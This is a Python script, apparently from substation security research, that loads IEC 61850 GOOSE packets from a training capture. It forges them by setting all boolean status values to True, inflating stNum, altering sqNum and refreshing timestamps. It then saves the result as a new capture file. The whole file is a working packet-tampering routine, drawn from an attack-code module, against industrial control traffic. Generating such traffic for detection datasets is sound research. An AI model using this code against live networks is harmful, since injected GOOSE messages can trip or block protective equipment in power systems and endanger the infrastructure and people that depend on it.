

import os, sys, datetime, inspect, struct, time, argparse, pyshark
import numpy as np
import random
from struct import *
from time import sleep
from copy import deepcopy
from warnings import filterwarnings
filterwarnings("ignore")

from pyasn1.codec.ber import decoder
from pyasn1.codec.ber import encoder
from pyasn1.type import char
from pyasn1.type import tag
from pyasn1.type import univ
from scapy.layers.l2 import Ether
from scapy.layers.l2 import Dot1Q
from scapy.compat import raw
from scapy.utils import hexdump
from scapy.utils import wrpcap
from scapy.all import rdpcap
from scapy.all import sendp

networkInterface = "eth1"
filter_string = "ether proto 0x88B8 and len <= 200"
GOOSE_TYPE = 0x88b8



from goose.goose import GOOSE
from goose.goose import GOOSEPDU
from goose.goose_pdu import AllData
from goose.goose_pdu import Data
from goose.goose_pdu import IECGoosePDU
from goose.goose_pdu import UtcTime


from Attack_code_high_stNum_const_sqNum_with_delay import curTime64Bits, gooseAllData_decode


path = "goose_iisc_training.pcapng"

packets = rdpcap(path)

mod_packets = packets[:50]

# MODIFYING THE PACKETS
true_value = Data()
false_value = Data()
true_value.setComponentByName('boolean', True)
false_value.setComponentByName('boolean', False)

for mod_packet in mod_packets:
    
    # EXTRACTING THE GOOSE HEADER (8 Bytes: APPID, Length, Reserved 1, Reserved 2)
    mod_packet_load_start_goose = mod_packet.load[:8] 

    # EXTRACTING THE allData PAYLOAD FROM THE END (6 bytes)
    mod_packet_load_end_alldata = mod_packet.load[-6:]

    # PARSE THE GOOSE PACKET FOR MODIFICATION
    mod_data = GOOSE(mod_packet.load)
    mod_pdu = mod_data[GOOSEPDU].original
    mod_pdu_decode = gooseAllData_decode(mod_pdu)

    # MODIFYING THE SQNUM AND STNUM PACKETS
    tmpSQNUM = mod_pdu_decode.getComponentByName('sqNum')
    tmpSTNUM = mod_pdu_decode.getComponentByName('stNum')

    # UPDATING THE BOOLEAN VALUES IN THE GOOSEPDU HEADER

    for value in range(0,mod_pdu_decode['numDatSetEntries']):
        if mod_pdu_decode['allData'].getComponentByPosition(value) == False:
            mod_pdu_decode['allData'].setComponentByPosition(value, true_value)
            continue
        elif mod_pdu_decode['allData'].getComponentByPosition(value) == True:
            mod_pdu_decode['allData'].setComponentByPosition(value, true_value)
            continue

    # INCREMENT THE STNUM VALUE 
    mod_pdu_decode.setComponentByName('stNum', (int(tmpSTNUM))+random.randint(0, 10000))

    # RESETING THE SQNUM VALUE, note that we will need to increment this or increment stNum and keep this 0
    mod_pdu_decode.setComponentByName('sqNum', int(tmpSTNUM) + 50) 

    # WE ALSO HAVE TO CHANGE THE TIMESTAMP WITH THE CURRENT ONE, AND THE TIME SHOULD BE IN 64 BITS
    new_time = curTime64Bits()
    mod_pdu_decode.setComponentByName('t',new_time)

    # ENCODED THE MODIFIED DATA (ASN.1/BER)
    encoded_data = encoder.encode(mod_pdu_decode)
    
    # REBUILD THE MOD PACKET (GOOSE HEADER + MODIFIED PAYLOAD + REMAINING DATA STRUCTURE)
    mod_packet.load = mod_packet_load_start_goose + encoded_data #+ mod_packet_load_end_alldata
    

for mod_packet in mod_packets:
    wrpcap("stNum_sqNum_bool.pcapng", mod_packet, append=True)